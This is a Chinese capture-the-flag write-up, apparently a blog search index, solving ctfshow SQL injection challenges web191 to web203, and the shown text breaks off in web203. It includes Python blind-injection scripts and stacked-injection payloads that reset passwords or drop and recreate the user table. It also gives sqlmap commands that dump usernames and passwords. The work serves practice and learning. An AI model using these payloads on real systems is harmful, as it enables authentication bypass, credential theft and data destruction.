<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web191-web213SQL注入篇（二）</title>
      <link href="/2023/07/12/web191-web213SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/07/12/web191-web213SQL%E6%B3%A8%E5%85%A5%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web191"><a href="#web191" class="headerlink" title="web191"></a>web191</h1><p>跟上题一样，由于换了一章，就重新叙述一下。<br>布尔盲注需要先找到一个可改变的注入点。<br>比如：</p><ul><li><code>admin&#39; and 0#</code>时返回的是用户名不存在</li><li><code>admin&#39; and 1#</code>返回的是密码错误</li></ul><p>由此编写脚本：这题还是用是190的脚本即可<br>直接使用paayload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://cc8108f9-dbcc-44a5-aba7-90536cd74d69.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(substr((select group_concat(f1ag) from ctfshow_fl0g),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><h1 id="web192"><a href="#web192" class="headerlink" title="web192"></a>web192</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//TODO:感觉少了个啥，奇怪</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file|into|ascii|ord|hex/i&#x27;</span>, $username))&#123;</span><br><span class="line">        $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">        die(json_encode($ret));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可惜对我没用，我这里没用ascii做，前面几个可以结合ascii和二分法结合查找，wp写的很巧妙。<br>比如：<code>if(ascii(substr((&#123;payload&#125;),&#123;i&#125;,1))&gt;&#123;mid&#125;,sleep(3),1)</code><br>还是使用上题的脚本。</p><h1 id="web193"><a href="#web193" class="headerlink" title="web193"></a>web193</h1><h3 id="substr过滤可以使用mid、left、right来代替"><a href="#substr过滤可以使用mid、left、right来代替" class="headerlink" title="substr过滤可以使用mid、left、right来代替"></a>substr过滤可以使用mid、left、right来代替</h3><p>把substr过滤了，根据网上所说，可以用这几个来实现相同操作：<br>先来介绍一下几个函数用法，以下由gpt输出。</p><ol><li>MID函数：<ul><li>MID(string, start, length)：从指定的字符串中提取一个子字符串。它接受三个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>start：指定要开始提取的位置的索引。索引从1开始。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用MID函数提取其中的子字符串，如下所示：</li></ol><ul><li>MID(‘Hello, World!’, 1, 5)：提取从索引位置1开始的5个字符，结果为’Hello’。</li></ul></li><li>LEFT函数：<ul><li>LEFT(string, length)：从指定的字符串的开头提取一个子字符串。它接受两个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用LEFT函数提取其中的子字符串，如下所示：</li></ol><ul><li>LEFT(‘Hello, World!’, 5)：提取开头的5个字符，结果为’Hello’。</li></ul></li><li>RIGHT函数：<ul><li>RIGHT(string, length)：从指定的字符串的末尾提取一个子字符串。它接受两个参数：<ul><li>string：要提取子字符串的源字符串。</li><li>length：指定要提取的子字符串的长度。</li></ul></li></ul><ol><li>例如，假设有一个字符串’Hello, World!’，你可以使用RIGHT函数提取其中的子字符串，如下所示：</li></ol><ul><li>RIGHT(‘Hello, World!’, 6)：提取末尾的6个字符，结果为’World!’。</li></ul></li></ol><p>这里用mid即可，稍作修改脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQL布尔盲注2.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/11 22:02   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://b40c977f-1bc2-4d31-97ee-da13510260aa.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">str1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&#123;&lt;&gt;$=,;_ -&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid(database(),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;admin&#x27;and+if(mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">payload = <span class="string">&quot;admin&#x27;and+if(mid((select group_concat(f1ag) from ctfshow_flxg),&#123;&#125;,1)=(&#x27;&#123;&#125;&#x27;),1,0)#&quot;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> str1:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i, j),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;msg&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>但是这里还是简单提一下left和right这里的写法：<br>right<br>从右边开始截取,配合ascii使用.<br>ascii(‘str’)返回字符串的第一个字符的ascii码<br>ascii(right(‘abc’,2))= 97相当于 ascii(‘bc’)=97<br>left<br>从左边开始截取,用reverse反转<br>ascii(reverse(left(‘abc’,2))) = 97 相当于 ascii(‘bc’)=97<br>mid和strsub效果一样,代码同上<br>这是一种解法，还可以：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;and ((left((select database()),&#123;&#125;)=&#x27;</span>&#123;&#125;<span class="string">&#x27;))#</span></span><br></pre></td></tr></table></figure><h1 id="web194"><a href="#web194" class="headerlink" title="web194"></a>web194</h1><p>left和right被滤掉了<br>还能用mid。<br>上题相同脚本即可。</p><h1 id="web195"><a href="#web195" class="headerlink" title="web195"></a>web195</h1><h3 id="堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字"><a href="#堆叠注入-a-0匹配所有开头不是数字或者为0的字符串和数字" class="headerlink" title="堆叠注入 a=0匹配所有开头不是数字或者为0的字符串和数字"></a>堆叠注入 <strong>a=0匹配所有开头不是数字或者为0的字符串和数字</strong></h3><blockquote><p><a href="https://www.cnblogs.com/backlion/p/9721687.html">https://www.cnblogs.com/backlion/p/9721687.html</a></p></blockquote><p>什么是堆叠注入，我一听这名字也懵了一下，查了一下，就是末尾加<code>；</code>链接下一个命令语句。使其一起执行。<br>空格被过滤了，可以用反引号执行。<br>题目里提示说登陆成功即可得到flag，那么将数据的密码切换为自己的密码即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($row[<span class="number">0</span>]==$password)&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is $flag&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于sql的知识就是一坨，还是先查了一下写法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> table_name</span><br><span class="line"><span class="keyword">SET</span> column1 <span class="operator">=</span> value1, column2 <span class="operator">=</span> value2, ...</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">condition</span>;</span><br></pre></td></tr></table></figure><p>因此可以写出payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br><span class="line">然后上传</span><br><span class="line">username<span class="operator">=</span><span class="number">0</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>就会返回flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689160962992-9e51c7f1-4f6c-428c-ba4f-5a04d65443df.png" alt="image.png"><br><strong>（username=0这个做法在web188中有提到，就是匹配所有开头不是数字或者为0的字符串和数字0）</strong><br>或者，还可以：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x61646d696e</span>;<span class="keyword">update</span>`ctfshow_user`<span class="keyword">set</span>`pass`<span class="operator">=</span><span class="number">123456</span></span><br><span class="line">然后账号<span class="number">0x61646d696e</span>和密码<span class="number">123456</span></span><br></pre></td></tr></table></figure><h1 id="web196"><a href="#web196" class="headerlink" title="web196"></a>web196</h1><p>限制了用户名长度。看了wp才发现，这里的select没被过滤。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689163102786-54c21ea0-9ae6-4f5c-bb7d-81ba8af98594.png" alt="image.png"><br>啊这<br>payload：<code>username=1;select(1)&amp;password=1</code>让select的值覆盖给需要比对的参数，然后再传入你需要的密码。</p><h1 id="web197"><a href="#web197" class="headerlink" title="web197"></a>web197</h1><h3 id="show-tables查看表名-drop-create删表和创建表-insert插入数据"><a href="#show-tables查看表名-drop-create删表和创建表-insert插入数据" class="headerlink" title="show tables查看表名 drop\create删表和创建表 insert插入数据"></a>show tables查看表名 drop\create删表和创建表 insert插入数据</h3><h2 id="方法一-show-tables"><a href="#方法一-show-tables" class="headerlink" title="方法一 show tables"></a>方法一 show tables</h2><p>show tables获取表名的结果集。<br>由题目可知，ctfshow_user在其中，我们只需要这样传值即可</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span>;<span class="keyword">show</span> tables<span class="operator">&amp;</span>password<span class="operator">=</span>ctfshow_user</span><br></pre></td></tr></table></figure><h2 id="方法二-删表-把他变成自己的样子"><a href="#方法二-删表-把他变成自己的样子" class="headerlink" title="方法二 删表 把他变成自己的样子"></a>方法二 删表 把他变成自己的样子</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">drop</span> <span class="keyword">table</span> ctfshow_user;<span class="keyword">create</span> <span class="keyword">table</span> ctfshow_user(`username` <span class="type">varchar</span>(<span class="number">100</span>),`pass` <span class="type">varchar</span>(<span class="number">100</span>));<span class="keyword">insert</span> ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">1</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>然后直接账号密码输入1和1即可<br>当然也可以直接insert插入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">insert</span>  ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">password:<span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="SQL知识补充-drop、create、insert"><a href="#SQL知识补充-drop、create、insert" class="headerlink" title="SQL知识补充-drop、create、insert"></a>SQL知识补充-drop、create、insert</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> OBJECT_TYPE [IF <span class="keyword">EXISTS</span>] object_name;</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `OBJECT_TYPE`：指定要删除的对象类型，如`<span class="keyword">TABLE</span>`（表）、`<span class="keyword">VIEW</span>`（视图）等。</span><br><span class="line"><span class="operator">-</span> `IF <span class="keyword">EXISTS</span>`（可选）：如果加上此选项，如果要删除的对象不存在，则不会引发错误。</span><br><span class="line"><span class="operator">-</span> `object_name`：指定要删除的对象的名称。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> OBJECT_TYPE object_name</span><br><span class="line">(</span><br><span class="line">    column1 data_type,</span><br><span class="line">    column2 data_type,</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `OBJECT_TYPE`：指定要创建的对象类型，如`<span class="keyword">TABLE</span>`（表）、`<span class="keyword">VIEW</span>`（视图）等。</span><br><span class="line"><span class="operator">-</span> `object_name`：指定要创建的对象的名称。</span><br><span class="line"><span class="operator">-</span> `column1 data_type, column2 data_type, ...`：指定对象的列及其数据类型。</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name (column1, column2, ...)</span><br><span class="line"><span class="keyword">VALUES</span> (value1, value2, ...);</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> `table_name`：指定要插入数据的表的名称。</span><br><span class="line"><span class="operator">-</span> `column1, column2, ...`：指定要插入数据的列。</span><br><span class="line"><span class="operator">-</span> `value1, value2, ...`：指定要插入的值，与列一一对应。</span><br></pre></td></tr></table></figure><h1 id="web198"><a href="#web198" class="headerlink" title="web198"></a>web198</h1><p>继续用上题的insert插入即可。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username:<span class="number">0</span>;<span class="keyword">insert</span>  ctfshow_user(`username`,`pass`) <span class="keyword">value</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">password:<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="web199、web200"><a href="#web199、web200" class="headerlink" title="web199、web200"></a>web199、web200</h1><p>括号被禁用了，那就用那个show tables</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>;<span class="keyword">show</span> tables</span><br><span class="line"></span><br><span class="line">ctfshow_user</span><br></pre></td></tr></table></figure><h1 id="web201"><a href="#web201" class="headerlink" title="web201"></a>web201</h1><h3 id="sqlmapGET注入-referer"><a href="#sqlmapGET注入-referer" class="headerlink" title="sqlmapGET注入 referer"></a>sqlmapGET注入 referer</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">当前数据库</span><br><span class="line">参数：<span class="comment">--current-db</span></span><br><span class="line">返还当前连接的数据库。</span><br><span class="line"></span><br><span class="line">列举数据库表</span><br><span class="line">参数：<span class="comment">--tables,--exclude-sysdbs,-D</span></span><br><span class="line">当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出一个特定数据的所有表。</span><br><span class="line">如果你不提供<span class="operator">-</span>D参数来列指定的一个数据的时候，sqlmap会列出数据库所有库的所有表。</span><br><span class="line"><span class="comment">--exclude-sysdbs参数是指包含了所有的系统数据库。</span></span><br><span class="line">需要注意的是在Oracle中你需要提供的是TABLESPACE_NAME而不是数据库名称。</span><br><span class="line"></span><br><span class="line">列举数据库表中的字段</span><br><span class="line">参数：<span class="comment">--columns,-C,-T,-D</span></span><br><span class="line">当前用户有权限读取包含所有数据库表信息的表中的时候，即可列出指定数据库表中的字段，同时也会列出字段的数据类型。</span><br><span class="line">如果没有使用<span class="operator">-</span>D参数指定数据库时，默认会使用当前数据库。</span><br><span class="line"></span><br><span class="line">获取整个表的数据</span><br><span class="line">参数：<span class="comment">--dump,-C,-T,-D,--start,--stop,--first,--last</span></span><br><span class="line">如果当前管理员有权限读取数据库其中的一个表的话，那么就能获取真个表的所有内容。</span><br><span class="line">使用<span class="operator">-</span>D,<span class="operator">-</span>T参数指定想要获取哪个库的哪个表，不适用<span class="operator">-</span>D参数时，默认使用当前库。</span><br></pre></td></tr></table></figure><p>payload：<code>sqlmap -u http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/api/\?id\=1 --refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</code><br>返回出：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166554462-4a3c7438-52d5-4b6d-b87d-910192d93e48.png" alt="image.png"><br>然后用payload爆表爆词条<br>爆库：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166695514-becf0b5a-ebd9-4e7f-a93f-08e61f61a372.png" alt="image.png"><br>爆表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php -D ctfshow_web --tables</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166764719-0fee533f-e0a8-4971-bd2d-a8ea49d132f4.png" alt="image.png"><br>爆词条</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162-be40-4b3bf863a2b4.challenge.ctf.show/sqlmap.php -D ctfshow_web -T ctfshow_user --columns</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166806079-e9066b90-185d-4eee-a837-3c79ea26c08c.png" alt="image.png"><br>查看字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span><span class="number">6859</span>defc<span class="number">-0622</span><span class="number">-4162</span><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span>\?id\<span class="operator">=</span><span class="number">1</span> <span class="comment">--refer=http://6859defc-0622-4162</span></span><br><span class="line"><span class="operator">-</span>be40<span class="number">-4</span>b3bf863a2b4.challenge.ctf.show<span class="operator">/</span>sqlmap.php <span class="operator">-</span>D ctfshow_web <span class="operator">-</span>T ctfshow_user <span class="operator">-</span>C id,pass,username <span class="comment">--dump</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689166915916-68f13c0c-13e8-47fd-90f4-fe5f87d32ff1.png" alt="image.png"></p><h1 id="web202"><a href="#web202" class="headerlink" title="web202"></a>web202</h1><h3 id="sqlmapPOST注入-注意–referer和–data"><a href="#sqlmapPOST注入-注意–referer和–data" class="headerlink" title="sqlmapPOST注入 注意–referer和–data"></a>sqlmapPOST注入 注意–referer和–data</h3><p>抓包用的虽然是get，但是提示说是用post传参。<br>那就用post试一下。<br>我不理解这个referer的ctf.show是怎么确定的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>u http:<span class="operator">/</span><span class="operator">/</span>c3420367<span class="number">-21</span>b9<span class="number">-4692</span><span class="number">-8570</span><span class="number">-1</span>ac73fb7a651.challenge.ctf.show<span class="operator">/</span>api<span class="operator">/</span> <span class="comment">--data=&#x27;id=1&#x27; --refer=&#x27;ctf.show&#x27; --dbs</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://c3420367-21b9-4692-8570-1ac73fb7a651.challenge.ctf.show/api/ --data=<span class="string">&#x27;id=1&#x27;</span> --referer=<span class="string">&#x27;ctf.show&#x27;</span> -D ctfshow_web -T ctfshow_user -C <span class="built_in">id</span>,pass,username --dump</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1689168116809-aecb017b-30da-4d98-8cf2-62ae2e821ebf.png" alt="image.png"></p><h1 id="web203"><a href="#web203" class="headerlink" title="web203"></a>web203</h1><h3 id="–method-切换方式-PUT请求"><a href="#–method-切换方式-PUT请求" class="headerlink" title="–method 切换方式 PUT请求"></a>–method 切换方式 PUT请求</h3><p>提示–method切换方式，使用PUT方法，需要加上Content-Type头，否则会变成表单提交：<br>我真的不太理解，这里为什么相同参数 我的就不行，wp的就可以：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://3c00342b-19a7-4a23-aa48-e84c36c5bcef.challenge.ctf.show/api/index.php --refer=<span class="string">&quot;ctf.show&quot;</span> --data=<span class="string">&quot;id=1</span></span><br><span class="line"><span class="string">&quot;</span> --method=<span class="string">&quot;PUT&quot;</span> --headers=<span 